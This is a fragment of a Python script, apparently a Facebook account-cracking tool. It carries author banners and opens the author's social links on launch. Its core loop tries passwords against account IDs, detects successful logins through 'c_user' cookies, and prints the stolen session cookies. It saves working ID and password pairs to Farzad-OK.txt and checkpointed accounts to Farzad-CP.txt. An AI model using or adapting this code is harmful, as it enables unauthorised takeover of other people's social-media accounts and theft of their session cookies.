...
print('\033[1;32m FOLLOW MY FACEBOOK CHANNEL..\033[1;32m')
print('\033[1;32m FOLLOW MY YOUTUBE CHANNEL..\033[1;32m')
...
os.system('xdg-open https://t.me/SofizakiaryanandFariedtechnical')
os.system('xdg-open https://www.facebook.com/s farid.Gawhari .75')
os.system('xdg-open https://www.youtube.com/Sofizaki_and_Faried_technical')
from os import path
...
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  _________   | || |      __      | || |  _______     | || |   ________   | || |      __      | || |  ________    | |
| | |_   ___  |  | || |     /  \     | || | |_   __ \    | || |  |  __   _|  | || |     /  \     | || | |_   ___ `.  | |
| |   | |_  \_|  | || |    / /\ \    | || |   | |__) |   | || |  |_/  / /    | || |    / /\ \    | || |   | |   `. \ | |
| |   |  _|      | || |   / ____ \   | || |   |  __ /    | || |     .'.' _   | || |   / ____ \   | || |   | |    | | | |
| |  _| |_       | || | _/ /    \ \_ | || |  _| |  \ \_  | || |   _/ /__/ |  | || | _/ /    \ \_ | || |  _| |___.' / | |
| | |_____|      | || ||____|  |____|| || | |____| |___| | || |  |________|  | || ||____|  |____|| || | |________.'  | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
\033[1;97m====================================================
[+] AUTHOR    : ❤Farzad Akbare 󱢏🇦🇫
[+] FACEBOOK  : ❤s Farid Gawhari 󱢏🇦🇫
[+] TOOLS     : 🇦🇫FREE🇦🇫
[+] VERSION   : \033[1;92m1.3
\033[1;97m[+]\033[1;91m THANKS FORM ALLAH ❤🕋❤
\033[1;97m====================================================""")  
def lines():
	print('\033[1;97m====================================================')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Farzad -OK] '+cid+' | '+ps+'\033[0;97m\n[]\033[0;37m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('Farzad-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[Farzad-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Farzad-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mFarzad\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
